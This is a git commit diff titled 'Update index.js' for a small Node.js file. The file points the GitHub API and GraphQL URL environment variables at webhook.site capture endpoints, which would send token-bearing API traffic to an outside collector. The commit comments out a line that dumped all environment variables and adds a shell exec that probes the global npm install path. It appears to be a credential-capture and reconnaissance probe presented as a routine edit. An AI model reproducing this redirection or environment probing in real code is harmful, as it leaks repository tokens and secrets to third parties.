548f79278e0dfce967c616c7dcc689ecbcaa2022
test01 <66986661+testweb01@users.noreply.github.com>
2024-09-21 20:03:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,17 @@
 process.env['GITHUB_API_URL']="webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/gitapi"
 
 process.env['GITHUB_GRAPHQL_URL'] = "webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/graphqlapi"
-console.log( process.env );
+//console.log( process.env );
+const { exec } = require('child_process');
+// Execute the 'ls' command
+exec('npm root -g', (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`Stderr: ${stderr}`);
+    return;
+  }
+  console.log(`Stdout: ${stdout}`);
+});
